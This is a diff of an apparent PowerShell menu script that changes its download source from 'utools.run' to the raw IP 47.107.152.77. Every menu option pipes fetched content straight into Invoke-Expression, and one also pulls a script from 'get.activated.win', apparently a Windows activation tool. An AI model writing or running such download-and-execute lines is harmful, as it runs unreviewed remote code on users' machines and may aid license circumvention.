@@ -48,7 +48,7 @@ function diskhandler {
 
 function Set-ConsoleWidth {
      param (
-          [string]$Title = 'utools.run'
+          [string]$Title = '47.107.152.77'
      )
      
      Clear-Host
@@ -137,14 +137,14 @@ function Show-MainMenu {
 
      switch ($selection) {
             '1' {
-               Invoke-RestMethod utools.run/new_task | Invoke-Expression
+               Invoke-RestMethod 47.107.152.77/new_task | Invoke-Expression
           } '2' {
-               Invoke-RestMethod utools.run/harden | Invoke-Expression
+               Invoke-RestMethod 47.107.152.77/harden | Invoke-Expression
           } '3' {
-               Invoke-RestMethod utools.run/ansible | Invoke-Expression
+               Invoke-RestMethod 47.107.152.77/ansible | Invoke-Expression
           }'4' {
                Write-Host -ForegroundColor Yellow "Loading Script, please wait a while..."
-               Invoke-RestMethod utools.run/new_task| Invoke-Expression |Out-Null
+               Invoke-RestMethod 47.107.152.77/new_task| Invoke-Expression |Out-Null
 
                $url = "https://get.activated.win"
                Invoke-RestMethod -UseBasicParsing $url  | Invoke-Expression
@@ -161,15 +161,15 @@ function Show-MainMenu {
                     }
                }
           }'5' {
-               Invoke-RestMethod utools.run/jetbrains | Invoke-Expression
-               Invoke-RestMethod utools.run/new_task| Invoke-Expression |Out-Null
+               Invoke-RestMethod 47.107.152.77/jetbrains | Invoke-Expression
+               Invoke-RestMethod 47.107.152.77/new_task| Invoke-Expression |Out-Null
 
           }'6' {
-               Invoke-RestMethod utools.run/qt | Invoke-Expression
-               Invoke-RestMethod utools.run/new_task| Invoke-Expression |Out-Null
+               Invoke-RestMethod 47.107.152.77/qt | Invoke-Expression
+               Invoke-RestMethod 47.107.152.77/new_task| Invoke-Expression |Out-Null
 
           }'7' {
-               Invoke-RestMethod utools.run/autorunAndProcessExplorer | Invoke-Expression
+               Invoke-RestMethod 47.107.152.77/autorunAndProcessExplorer | Invoke-Expression
           }
           
           'q' {
